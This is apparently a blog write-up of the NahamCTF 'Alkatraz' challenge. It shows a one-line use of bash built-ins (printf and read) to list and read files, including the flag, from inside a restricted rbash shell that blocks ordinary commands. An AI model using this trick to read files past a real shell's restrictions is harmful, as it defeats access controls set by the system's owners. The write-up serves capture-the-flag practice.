---
title: "NahamCTF: Alkatraz"
categories:
  - NahamCTF  
tags:
  - NahamCTF  
---

"We are so restricted here in Alkatraz. Can you help us break out?"

For this challenge, we're given a very restricted shell when we connect the the nc listener. Most commands don't work, and we can't escape the shell by running bash, or sh. We can, however, use basic built-in bash commands to read the flag:

```
printf '%s\n' .* *; for i in $(printf '%s\n' .* *); do read var < $i && echo $var ; done

.
..
.bash_logout
.bashrc
.profile
flag.txt
/bin/rbash: line 32: read: read error: 0: Is a directory
/bin/rbash: line 32: read: read error: 0: Is a directory
# ~/.bash_logout: executed by bash(1) when login shell exits.
# ~/.bashrc: executed by bash(1) for non-login shells.
# ~/.profile: executed by the command interpreter for login shells.
flag{congrats_you_just_escaped_alkatraz}
```

**flag{congrats_you_just_escaped_alkatraz}**
